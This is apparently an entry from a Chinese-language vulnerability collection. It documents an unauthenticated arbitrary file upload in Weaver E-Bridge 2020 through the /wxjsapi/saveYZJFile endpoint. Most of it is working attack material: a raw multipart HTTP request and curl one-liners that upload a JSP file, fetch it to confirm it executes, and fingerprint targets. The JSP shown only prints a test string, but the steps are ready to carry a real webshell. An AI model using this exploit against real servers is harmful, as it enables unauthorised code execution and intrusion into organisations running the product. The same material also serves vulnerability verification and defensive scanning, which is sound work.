## 漏洞描述

泛微E-Bridge存在任意文件上传漏洞，可上传JSP webshell。

## 影响版本

- 泛微 E-Bridge 2020

## 前置条件

- 目标运行泛微 E-Bridge 且可通过网络访问
- `/wxjsapi/saveYZJFile` 接口未做访问限制
- 无需认证

## 利用步骤

### 上传 webshell

```http
POST /wxjsapi/saveYZJFile HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadFile"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print("test");%>
------WebKitFormBoundary--
```

### 访问 webshell

```
GET /file/test.jsp HTTP/1.1
```

## Payload

### 上传 webshell

```bash
curl -X POST "http://target/wxjsapi/saveYZJFile" \
  -F 'uploadFile=@-;filename=test.jsp;type=application/octet-stream' <<< '<%out.print("vuln_test");%>'
```

### 访问 webshell 确认执行

```bash
curl -s "http://target/file/test.jsp"
```

## 验证方法

- 上传请求返回成功状态码（200）且响应中包含上传文件路径
- 访问上传的 JSP 文件，响应中包含 `vuln_test` 即确认漏洞存在

```bash
curl -s "http://target/file/test.jsp" | grep "vuln_test"
```

## 指纹确认

```bash
curl -s http://target/wxjsapi/ | grep -i "weaver\|e-bridge"
```
